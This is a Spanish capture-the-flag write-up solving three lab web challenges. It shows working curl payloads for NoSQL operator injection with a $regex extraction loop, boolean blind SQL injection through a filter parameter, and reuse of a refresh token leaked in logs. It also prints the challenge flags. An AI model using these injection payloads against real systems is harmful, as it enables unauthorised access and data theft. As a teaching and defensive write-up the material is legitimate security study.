# Tres formas de hacer que una aplicación revele más de lo previsto

[← Volver al índice](../README.md)

## Pachamama Status: cuando la contraseña deja de ser texto

Lo primero que me llamó la atención fue que `/api/login` aceptaba un objeto JSON en `password`, un campo donde esperaba enviar texto. Eso abría la posibilidad de pasar operadores de consulta y cambiar la comparación que hacía la aplicación.

Con el usuario `pachamama_admin`, esta petición devolvió `success:true`:

```bash
U='http://127.0.0.1:8000'  # Sustituir por la instancia del laboratorio.
curl -s -X POST "$U/api/login" \
  -H 'Content-Type: application/json' \
  -d '{"username":"pachamama_admin","password":{"$ne":null}}'
```

Con `$ne`, que significa «distinto de», la petición conseguía que se comprobara que el campo no fuera nulo; después de ver el éxito del login, quise comprobar si ese comportamiento también permitía recuperar el valor de la contraseña.

Probé un prefijo mediante `$regex`:

```json
{"username":"pachamama_admin","password":{"$regex":"^csh"}}
```

Tanto la prueba con `^csh` como la de `csh{` devolvieron éxito, así que ya tenía una forma de preguntar si un prefijo era correcto y avanzar un carácter a la vez.

El [script de extracción](../scripts/pachamama_nosqli.py) partía de `csh{` e iba conservando el siguiente carácter que producía éxito, escapando siempre el prefijo con `re.escape` para que las llaves y los demás caracteres especiales se trataran como texto.

```python
if matches('^' + re.escape(flag + candidate)):
    flag += candidate
```

La primera ejecución se detuvo con `HTTP Error 401: Unauthorized`, aunque ese error era esperable cada vez que un candidato fallaba. La versión que dejé guardada captura `HTTPError` y lee el cuerpo de la respuesta para continuar con el siguiente intento.

![Pruebas con operadores y extracción de la flag de Pachamama](../assets/pachamama.jpg)

```text
csh{7d40323163f3acd0bfe07bd11435c8aeaf2a78c24e96bbf04413d9c1bc096eff}
```

Me quedé con la relación entre el bypass y la extracción: una vez que podía cambiar la condición de autenticación, las respuestas del login me servían para reconstruir la contraseña. También entendí mejor por qué validar un JSON implica comprobar el tipo de cada campo y no solo su nombre.

## Mallku Rewards: preguntar una cosa por vez

En `/api/members?filter=...` empecé probando texto y payloads con comillas, pero los errores de sintaxis y mensajes como `no such column: a` me hicieron cambiar de enfoque: el parámetro parecía entrar directamente como una expresión SQL.

Las pruebas que despejaron la duda fueron estas:

```bash
curl -sG "$U/api/members" --data-urlencode 'filter=1=1'
curl -sG "$U/api/members" --data-urlencode 'filter=1=2'
```

Con `1=1` aparecían miembros y con `1=2` recibía `{"members":[]}`, una diferencia suficiente para hacer preguntas sobre la flag y distinguir las respuestas verdaderas de las falsas.

Después comprobé la tabla y el primer carácter:

```bash
curl -sG "$U/api/members" \
  --data-urlencode 'filter=(SELECT count(*) FROM flags)>0'

curl -sG "$U/api/members" \
  --data-urlencode "filter=(SELECT substr(flag,1,1) FROM flags)='c'"
```

El [script de Mallku](../scripts/mallku_sqli.py) aprovecha esa diferencia con búsqueda binaria, primero para calcular la longitud mediante `length(flag) >= n` y después para comparar el valor de cada carácter:

```sql
(SELECT unicode(substr(flag,POSICION,1)) FROM flags LIMIT 1) > VALOR
```

Para un alfabeto ASCII imprimible, no hace falta probar todos los caracteres: cada comparación descarta aproximadamente la mitad del intervalo. El script usa la presencia de `"id"` en la respuesta como señal de una lista no vacía, una decisión que funciona para la estructura de respuesta de este reto.

![Condiciones verdaderas y falsas y extracción en Mallku](../assets/mallku.jpg)

```text
Longitud: 69
csh{b64794120bad36d7a851305e8235a923297b4fc998d86bd99c043c4ca9862f9a}
```

Lo que me destrabó fue prestar atención al error y ajustar las pruebas al contexto de `filter`, porque seguir añadiendo comillas no ayudaba si la entrada ya se evaluaba como una expresión. Del lado del servidor, el filtro debería limitarse a operaciones definidas por la aplicación y usar parámetros para sus valores.

## Amaru Refresh: seguir el rastro de un token

En Amaru fui siguiendo las pistas del propio portal, empezando por este comentario en el HTML de la portada:

```html
<!-- assets listados en /static/manifest.json -->
```

La ruta `/logs` respondía 403 y, al revisar los recursos del cliente, apareció una cookie de diagnóstico llamada `ops_diag` que permitía acceder a los registros; su valor se ha omitido en los ejemplos públicos:

```bash
curl -s -H 'Cookie: ops_diag=<VALOR_DEL_LABORATORIO>' "$U/logs"
```

Entre los registros había una petición de `amaru_admin` a `/auth/refresh` con un `refresh_token` en la URL, de modo que el propio log había conservado el dato necesario para pedir una nueva credencial.

```bash
curl -s "$U/auth/refresh?refresh_token=<TOKEN_RECUPERADO>"
```

Al recibir el `access_token` probé con `Authorization: Bearer`, pero `/profile` devolvió «no autenticado», así que revisé otras formas de enviarlo hasta comprobar que la aplicación aceptaba la cookie `access_token` y también el parámetro de consulta.

```bash
curl -s -H 'Cookie: access_token=<TOKEN_RECIBIDO>' "$U/profile"
```

La respuesta incluía `role: admin`, `username: amaru_admin` y:

```text
csh{dcbd9ba98d35568f8b2098027350ed0d9785633aa4eaa1526d9a25b1b31f6bac}
```

Dejé la captura con los valores de sesión fuera del repositorio público y utilicé marcadores en los ejemplos para conservar la explicación sin publicar esos datos.

La solución terminó pasando por un token válido que había quedado expuesto en los registros, y el intento con Bearer me recordó que también había que comprobar cómo lo recibía el servicio. Desde este reto presto más atención a los recursos del frontend y a las funciones de diagnóstico, porque pueden revelar información suficiente para completar una cadena de acceso.
